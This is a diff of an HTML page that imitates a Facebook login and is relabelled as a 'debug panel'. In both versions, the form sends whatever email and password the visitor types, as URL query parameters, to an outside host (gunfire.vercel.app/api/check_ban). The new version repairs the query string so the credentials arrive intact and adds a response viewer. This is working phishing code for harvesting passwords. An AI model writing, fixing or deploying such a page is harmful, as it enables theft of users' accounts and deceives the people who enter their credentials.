@@ -1,51 +1,319 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
 <head>
-  <title>Facebook Login</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Advanced Facebook Login - Debug Panel</title>
   <style>
-    body {
-      font-family: Arial;
-      background-color: #f2f2f2;
-      margin: 0;
+    :root{
+      --bg:#f4f6fb;
+      --card:#ffffff;
+      --accent:#1877f2;
+      --muted:#6b7280;
+      --danger:#ef4444;
+      --shadow: 0 6px 18px rgba(20,30,50,0.08);
     }
-    .container {
-      max-width: 320px;
-      margin: 80px auto;
-      padding: 20px;
-      background: white;
-      border-radius: 8px;
-      box-shadow: 0 0 5px #ccc;
+    *{box-sizing:border-box}
+    body{
+      margin:0;
+      font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      background:linear-gradient(180deg,#eef2ff 0%,var(--bg) 100%);
+      color:#0f172a;
+      padding:28px;
+    }
+
+    .app{
+      max-width:1100px;
+      margin:0 auto;
+      display:grid;
+      grid-template-columns: 420px 1fr;
+      gap:20px;
+    }
+
+    .card{
+      background:var(--card);
+      border-radius:12px;
+      padding:18px;
+      box-shadow:var(--shadow);
+    }
+
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin-bottom:12px;
+    }
+    .logo{
+      width:46px;height:46px;border-radius:10px;
+      background:linear-gradient(135deg,#3b82f6,#8b5cf6);
+      display:flex;align-items:center;justify-content:center;color:white;font-weight:700;
+      font-size:18px;
+    }
+    h1{margin:0;font-size:18px}
+    p.lead{margin:6px 0 18px;color:var(--muted);font-size:13px}
+
+    form{display:flex;flex-direction:column;gap:12px}
+    input[type="text"], input[type="password"]{
+      width:100%;
+      padding:12px 14px;
+      border-radius:10px;
+      border:1px solid #e6e9ef;
+      outline:none;
+      font-size:14px;
+    }
+    input:focus{box-shadow:0 0 0 4px rgba(24,119,242,0.08);border-color:rgba(24,119,242,0.8)}
+
+    .row{display:flex;gap:10px}
+    .btn{
+      padding:10px 14px;border-radius:10px;border:0;cursor:pointer;font-weight:600;
+    }
+    .btn-primary{background:var(--accent);color:white}
+    .btn-ghost{background:transparent;border:1px solid #e6e9ef;color:var(--muted)}
+    .small{font-size:13px;padding:8px 10px;border-radius:8px}
+
+    .meta{font-size:12px;color:var(--muted);margin-top:6px}
+
+    /* JSON viewer column */
+    .json-panel{
+      display:flex;
+      flex-direction:column;
+      height:100%;
+      min-height:380px;
+    }
+    .panel-header{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:12px;
+      margin-bottom:12px;
+    }
+    .controls{display:flex;gap:8px;align-items:center}
+    .status {
+      font-size:13px;padding:8px 10px;border-radius:8px;border:1px solid #e6e9ef;background:#fff;
+    }
+    .viewer{
+      background:#0b1220;color:#e6eef8;padding:12px;border-radius:10px;flex:1;overflow:auto;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace;
+      font-size:13px;line-height:1.45;border:1px solid rgba(255,255,255,0.03)
+    }
+    pre.json {white-space:pre-wrap;word-break:break-word;margin:0}
+    .muted{color:var(--muted);font-size:13px}
+    .hint{font-size:12px;color:var(--muted);margin-top:10px}
+
+    .spinner {
+      width:18px;height:18px;border-radius:50%;border:3px solid rgba(255,255,255,0.15);border-top-color:white;animation:spin .8s linear infinite; display:inline-block;
+    }
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    /* small responsive */
+    @media (max-width:980px){
+      .app{grid-template-columns:1fr; padding-bottom:40px}
+      .json-panel{min-height:260px}
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2 style="text-align: center; color:                        
-    <form id="login-form">
-      <input type="text" id="username" placeholder="Email or phone number" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button type="submit">Log In</button>
-    </form>
-    <div id="result"></div>
+  <div class="app">
+    <!-- left: form -->
+    <div class="card">
+      <div class="brand">
+        <div class="logo">FB</div>
+        <div>
+          <h1>Advanced Login Debug</h1>
+          <p class="lead">Send request to API and inspect JSON response in real time.</p>
+        </div>
+      </div>
+
+      <form id="login-form" autocomplete="off">
+        <label class="muted">Email or phone</label>
+        <input type="text" id="username" placeholder="Email or phone number" required autocomplete="username" />
+
+        <label class="muted">Password</label>
+        <input type="password" id="password" placeholder="Password" required autocomplete="current-password" />
+
+        <div class="row">
+          <button id="submit" class="btn btn-primary" type="submit">Log In & Fetch</button>
+          <button id="clear" type="button" class="btn btn-ghost small">Clear</button>
+        </div>
+
+        <div class="meta">Request will be sent as a GET to the debug API. <strong>Note:</strong> If fetch fails due to CORS, enable CORS on the API or use a server-side proxy.</div>
+      </form>
+
+      <div class="hint">Tip: You can inspect status, response time, pretty JSON, copy or download the JSON directly.</div>
+    </div>
+
+    <!-- right: json viewer -->
+    <div class="card json-panel">
+      <div class="panel-header">
+        <div>
+          <div style="font-weight:700">API Response</div>
+          <div class="muted" id="endpoint-display">Endpoint: <span id="endpoint-text">-</span></div>
+        </div>
+
+        <div class="controls">
+          <div id="status-box" class="status muted">Idle</div>
+          <button id="copy-btn" class="btn small btn-ghost">Copy</button>
+          <button id="download-btn" class="btn small btn-ghost">Download</button>
+          <button id="toggle-raw" class="btn small btn-ghost">Raw / Pretty</button>
+        </div>
+      </div>
+
+      <div id="viewer" class="viewer">
+        <pre id="json-output" class="json">No response yet.</pre>
+      </div>
+
+      <div style="display:flex;gap:8px;margin-top:12px;align-items:center;justify-content:space-between">
+        <div class="muted" id="meta-info">Status: - • Time: - • Size: -</div>
+        <div class="muted" id="raw-size"> </div>
+      </div>
+    </div>
   </div>
 
   <script>
-    const form = document.getElementById('login-form');
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-      const url = `https://gunfire.vercel.app/api/check_ban?id=7254790945message=${username}message2${password}`;
+    (function(){
+      const form = document.getElementById('login-form');
+      const usernameEl = document.getElementById('username');
+      const passwordEl = document.getElementById('password');
+      const jsonOutput = document.getElementById('json-output');
+      const statusBox = document.getElementById('status-box');
+      const endpointText = document.getElementById('endpoint-text');
+      const copyBtn = document.getElementById('copy-btn');
+      const downloadBtn = document.getElementById('download-btn');
+      const toggleRawBtn = document.getElementById('toggle-raw');
+      const metaInfo = document.getElementById('meta-info');
+      const clearBtn = document.getElementById('clear');
 
-      fetch(url)
-        .then((response) => response.json())
-        .then((data) => {
-          document.getElementById('result').innerHTML = JSON.stringify(data);
-        })
-        .catch((error) => {
-          console.error(error);
+      let lastResponse = null;
+      let lastPretty = true;
+      let lastEndpoint = '';
+
+      // Helper: sanitize before inserting into pre (we use textContent so safe)
+      function showMessage(text){
+        jsonOutput.textContent = text;
+      }
+
+      function setStatus(text, busy=false){
+        statusBox.innerHTML = busy ? '<span class="spinner"></span> ' + text : text;
+      }
+
+      function formatJSON(obj){
+        try { return JSON.stringify(obj, null, 2); }
+        catch(e){ return String(obj); }
+      }
+
+      // Build the endpoint properly (fixes original broken query string)
+      function buildEndpoint(username, password){
+        // IMPORTANT: encodeURIComponent for safe query params
+        const base = 'https://gunfire.vercel.app/api/check_ban';
+        const id = '7254790945'; // same id you were using
+        const params = new URLSearchParams({
+          id: id,
+          message: username,
+          message2: password
         });
-    });
+        return base + '?' + params.toString();
+      }
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const u = usernameEl.value.trim();
+        const p = passwordEl.value;
+
+        if(!u || !p){
+          alert('Please fill both fields.');
+          return;
+        }
+
+        const endpoint = buildEndpoint(u, p);
+        lastEndpoint = endpoint;
+        endpointText.textContent = endpoint;
+
+        setStatus('Fetching...', true);
+        showMessage('Waiting for response...');
+        metaInfo.textContent = 'Status: fetching • Time: - • Size: -';
+
+        const start = performance.now();
+        try {
+          const resp = await fetch(endpoint, {
+            method: 'GET',
+            headers: {
+              'Accept': 'application/json'
+            }
+            // If API requires CORS and it's not enabled, this fetch will fail. See note below.
+          });
+
+          const duration = Math.round(performance.now() - start);
+          const size = resp.headers.get('content-length') || '-';
+
+          let bodyText = await resp.text();
+
+          // Try parse JSON (some APIs send text). If parse fails, show raw text.
+          let parsed = null;
+          try { parsed = JSON.parse(bodyText); }
+          catch(e){ parsed = null; }
+
+          lastResponse = parsed !== null ? parsed : bodyText;
+          lastPretty = true;
+
+          // Update UI
+          setStatus(`HTTP ${resp.status} ${resp.statusText}`, false);
+          metaInfo.textContent = `Status: ${resp.status} ${resp.statusText} • Time: ${duration} ms • Size: ${size}`;
+          // show pretty if JSON else raw text
+          if(parsed !== null) showMessage(formatJSON(parsed));
+          else showMessage(bodyText);
+
+        } catch (err) {
+          console.error(err);
+          setStatus('Error', false);
+          showMessage('Fetch failed: ' + err.message);
+          metaInfo.textContent = `Status: error • Time: - • Size: -`;
+        }
+      });
+
+      copyBtn.addEventListener('click', () => {
+        const text = jsonOutput.textContent;
+        if(!text) return alert('Nothing to copy.');
+        navigator.clipboard?.writeText(text).then(()=> {
+          copyBtn.textContent = 'Copied!';
+          setTimeout(()=> copyBtn.textContent = 'Copy', 1200);
+        }, ()=> alert('Copy failed.'));
+      });
+
+      downloadBtn.addEventListener('click', () => {
+        const text = jsonOutput.textContent;
+        if(!text) return alert('Nothing to download.');
+        const blob = new Blob([text], {type:'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'response.json';
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        URL.revokeObjectURL(url);
+      });
+
+      toggleRawBtn.addEventListener('click', () => {
+        if(lastResponse === null) return;
+        if(typeof lastResponse === 'string'){
+          // raw text only
+          showMessage(lastResponse);
+          return;
+        }
+        lastPretty = !lastPretty;
+        showMessage(lastPretty ? formatJSON(lastResponse) : JSON.stringify(lastResponse));
+      });
+
+      clearBtn.addEventListener('click', () => {
+        usernameEl.value = '';
+        passwordEl.value = '';
+        showMessage('No response yet.');
+        metaInfo.textContent = 'Status: - • Time: - • Size: -';
+        endpointText.textContent = '-';
+        setStatus('Idle', false);
+      });
+
+      // small UX: press Enter in password triggers submit automatically (browser does)
+    })();
   </script>
 </body>
 </html>
